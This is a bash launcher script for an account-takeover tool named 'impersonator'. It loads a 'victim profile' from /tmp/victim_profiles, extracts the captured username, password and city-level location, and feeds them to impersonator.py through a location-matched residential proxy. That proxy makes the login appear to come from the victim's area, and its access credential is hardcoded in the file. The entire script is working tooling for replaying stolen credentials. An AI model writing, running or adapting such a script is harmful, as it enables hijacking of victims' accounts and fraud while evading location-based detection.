#!/bin/bash
# Quick script to run impersonator with session ID

SESSION_ID="${1:-d8376699-8a30-47af-985e-1debd1be9b2b}"
PROFILE_PATH="/tmp/victim_profiles/${SESSION_ID}_profile.json"

if [ ! -f "$PROFILE_PATH" ]; then
    echo "[ERROR] Profile not found: $PROFILE_PATH"
    exit 1
fi

# Extract data from profile
echo "[INFO] Loading profile: $SESSION_ID"
USERNAME=$(python3 <<EOF
import json
with open('$PROFILE_PATH') as f:
    data = json.load(f)
    creds = data.get('credentials', [])
    if creds:
        print(creds[-1]['username'])
EOF
)

PASSWORD=$(python3 <<EOF
import json
with open('$PROFILE_PATH') as f:
    data = json.load(f)
    creds = data.get('credentials', [])
    if creds:
        print(creds[-1]['password'])
EOF
)

LOCATION=$(python3 <<EOF
import json
with open('$PROFILE_PATH') as f:
    data = json.load(f)
    loc = data.get('location', {})
    country = loc.get('country', '').lower()
    region = loc.get('region', '').replace(' ', '').lower()
    city = loc.get('city', '').replace(' ', '').lower()
    print(f"{country}|{region}|{city}")
EOF
)

IFS='|' read -r COUNTRY REGION CITY <<< "$LOCATION"

# Build proxy string with location targeting
PROXY_STRING="768b27aac68d92f840d9:b7564921f7b4962f@gw.dataimpulse.com:823"

echo "[INFO] Username: $USERNAME"
echo "[INFO] Password: ${PASSWORD:0:3}***"
echo "[INFO] Location: ${COUNTRY^^}/${REGION}/${CITY}"
echo "[INFO] Proxy: $PROXY_STRING"
echo ""
echo "[ACTION] Starting impersonator..."
echo ""

python3 impersonator.py \
    --profile "$PROFILE_PATH" \
    --username "$USERNAME" \
    --password "$PASSWORD" \
    --proxy "$PROXY_STRING"

